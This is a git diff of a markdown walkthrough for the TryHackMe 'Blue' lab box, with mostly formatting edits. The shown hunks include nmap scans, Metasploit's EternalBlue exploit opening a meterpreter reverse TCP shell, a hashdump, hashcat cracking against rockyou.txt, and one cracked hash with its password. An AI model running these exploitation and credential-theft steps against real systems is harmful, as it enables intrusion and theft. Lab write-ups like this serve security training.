@@ -1,6 +1,6 @@
-# Writeup for the Try_Hack_Me box - Blue. 
+# Writeup for the Try Hack Me box - [Blue](https://tryhackme.com/room/blue)
 
-The box has Eternal Blue (MS17-010) vulnerability which could be exploited to get on the box. It is an easy guided box.
+The box has Eternal Blue (MS17-010) vulnerability which could be exploited to get on the box. It is an easy guided box.\
 Has following sequels as Ice and Blaster. 
  
 > Pratyush Prakhar (5#1NC#4N) - 10/30/2020
@@ -10,32 +10,32 @@ Has following sequels as Ice and Blaster.
 1. Scan the machine using the favorite tool of all times - nmap.
    1. Ran a quick scan for the required port range (0-1000). 
 
-**Output**
+   **Output**
 
-```bash
-Nmap scan report for 10.10.130.42
-Host is up, received reset ttl 125 (0.19s latency).
-Scanned at 2020-10-29 01:39:50 EDT for 4s
-Not shown: 998 closed ports
-Reason: 998 resets
-PORT    STATE SERVICE      REASON
-135/tcp open  msrpc        syn-ack ttl 125
-139/tcp open  netbios-ssn  syn-ack ttl 125
-445/tcp open  microsoft-ds syn-ack ttl 125
-```
+   ```bash
+   Nmap scan report for 10.10.130.42
+   Host is up, received reset ttl 125 (0.19s latency).
+   Scanned at 2020-10-29 01:39:50 EDT for 4s
+   Not shown: 998 closed ports
+   Reason: 998 resets
+   PORT    STATE SERVICE      REASON
+   135/tcp open  msrpc        syn-ack ttl 125
+   139/tcp open  netbios-ssn  syn-ack ttl 125
+   445/tcp open  microsoft-ds syn-ack ttl 125
+   ```
    2. Then ran a standard scan - Default services and scripts on the determined specific ports **(135,139,445)**
 
-**Output**
+   **Output**
 
-```bash
-Nmap scan report for 10.10.130.42
-Host is up, received reset ttl 125 (0.16s latency).
-Scanned at 2020-10-29 01:51:13 EDT for 13s
-PORT    STATE SERVICE      REASON          VERSION
-135/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
-139/tcp open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
-445/tcp open  microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
-```
+   ```bash
+   Nmap scan report for 10.10.130.42
+   Host is up, received reset ttl 125 (0.16s latency).
+   Scanned at 2020-10-29 01:51:13 EDT for 13s
+   PORT    STATE SERVICE      REASON          VERSION
+   135/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
+   139/tcp open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
+   445/tcp open  microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+   ```
 
 2. Ran a nmap scan for finding the known vulnerabilities. We found that the box is susceptible to [MS17-010 EternalBlue CVE](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/).
 
@@ -43,7 +43,7 @@ PORT    STATE SERVICE      REASON          VERSION
 nmap -vv -p135,139,445 --script vuln -oN nmap/vulnub.nmap 10.10.130.42
 ```
 
-**OUTPUT**
+**Output**
 
 ```bash
 Host script results:
@@ -86,7 +86,7 @@ $ sudo msfdb run
 
 2. We use the _eternalblue_ one but actually the _psexec_ is the **most stable** version of the exploit. It should be used in normal scenarios. 
 
-**OUTPUT**
+**Output**
 
 ```bash
 msf5 > search ms17-010
@@ -105,7 +105,8 @@ Matching Modules
 
 3. _RHOSTS_ is the only flag required and not set. One can make additional chages to flags like _LHOST_ and _PAYLOAD_. We set RHOST to $BOX_IP and run the exoplit. I also set 	my _LPORT_ to 9999. 
 
-**OUTPUT**
+**Output**
+
 ```bash
 msf5 > use 2
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
@@ -123,7 +124,7 @@ SMBDomain      .                no        (Optional) The Windows domain to use f
 
 4. Run the exploit and we are in.
 
-**OUTPUT**
+**Output**
 
 ```bash
 [*] Started reverse TCP handler on 10.2.44.183:9999
@@ -172,7 +173,7 @@ Id  Name  Type                     Information                   Connection
 
 ```
 \
-We see we have indeed backgrounded our session.
+We see our session is in background.
 
 ## PRIVESC
 
@@ -250,6 +251,7 @@ meterpreter > migrate 2828
 We can now use _hashcat or johntheripper_ to crack them with correct mode and wordlist.
 
 **Output**
+
 ```bash
 meterpreter > hashdump
 Administrator:***************************************************************:::
@@ -257,17 +259,17 @@ Guest::***************************************************************:::
 Jon::***************************************************************:::
 ```
 
-2. The acquired hashes are **raw LANMAN/NTLM hashes**. The fourth field consist of the NTLM hash. We can use hascat to crack them with the following cmd.
+2. The acquired hashes are **raw LANMAN/NTLM hashes**. The fourth field consist of the NTLM hash. We can use hascat to crack them with the following cmd. The NTLM hashes are stored in hashes file. Dictionary used is rockyou.txt. 
+
+**Output**
+
 ```bash
 hashcat -m 1000 -a 3 hashes /opt/rockyou.txt
-```
-\
-The NTLM hashes are stored in hashes file. Dictionary used is rockyou.txt. 
-\
-**Cracked Output**
-`````
+
+hashcat hashes --show
+
 ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
-`````
+```
 
 ## FINDING FLAGS
 
